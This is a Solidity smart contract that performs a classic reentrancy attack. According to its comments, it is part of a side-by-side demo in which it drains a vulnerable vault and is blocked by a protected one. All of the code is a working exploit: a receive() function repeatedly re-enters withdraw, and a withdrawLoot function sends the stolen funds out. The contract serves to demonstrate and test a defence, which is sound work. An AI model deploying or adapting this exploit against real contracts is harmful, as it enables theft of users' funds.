// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @title ReentrancyAttacker — Real reentrancy exploit contract
/// @notice This is a REAL attacker contract that exploits the classic reentrancy vulnerability.
///         It WILL drain the VulnerableVault. It WILL be blocked by the ProtectedVault.
///         Used in the side-by-side demo to prove both that the attack is real
///         and that PolkaSentinel stops it.
contract ReentrancyAttacker {
    address public target;
    uint256 public attackAmount;
    uint256 public attackCount;
    uint256 public maxAttacks;

    event AttackStarted(address target, uint256 amount);
    event ReentryAttempt(uint256 count, uint256 balance);
    event AttackComplete(uint256 totalDrained);

    constructor() {
        maxAttacks = 5; // Max recursive calls to prevent infinite loops
    }

    /// @notice Execute reentrancy attack against a vault
    /// @param vault The target vault address
    function attack(address vault) external payable {
        target = vault;
        attackCount = 0;

        // Step 1: Deposit some ETH/PAS to have a balance in the vault
        uint256 depositAmount = msg.value;
        require(depositAmount > 0, "ReentrancyAttacker: send ETH to attack");

        (bool depositSuccess, ) = vault.call{value: depositAmount}(
            abi.encodeWithSignature("deposit()")
        );
        require(depositSuccess, "ReentrancyAttacker: deposit failed");

        attackAmount = depositAmount;
        emit AttackStarted(vault, depositAmount);

        // Step 2: Call withdraw — this triggers the reentrancy via receive()
        // solhint-disable-next-line no-unused-vars
        (bool withdrawSuccess, ) = vault.call(
            abi.encodeWithSignature("withdraw(uint256)", depositAmount)
        );
        // Note: withdrawSuccess may be false if PolkaSentinel blocks it
        // That's the expected behavior for ProtectedVault

        emit AttackComplete(address(this).balance);
    }

    /// @notice Fallback that re-enters the vault's withdraw function
    /// @dev This is where the reentrancy happens. When the vault sends ETH,
    ///      this function fires and calls withdraw() again BEFORE the vault
    ///      has updated the attacker's balance.
    receive() external payable {
        attackCount++;
        emit ReentryAttempt(attackCount, address(this).balance);

        if (attackCount < maxAttacks && target.balance >= attackAmount) {
            // Re-enter: call withdraw again while vault still thinks we have balance
            (bool success, ) = target.call(
                abi.encodeWithSignature("withdraw(uint256)", attackAmount)
            );
            // success may be false — that's fine, we stop recursion
            if (!success) {
                return;
            }
        }
    }

    /// @notice Withdraw stolen funds
    function withdrawLoot() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    /// @notice Check how much was stolen
    function getLoot() external view returns (uint256) {
        return address(this).balance;
    }
}
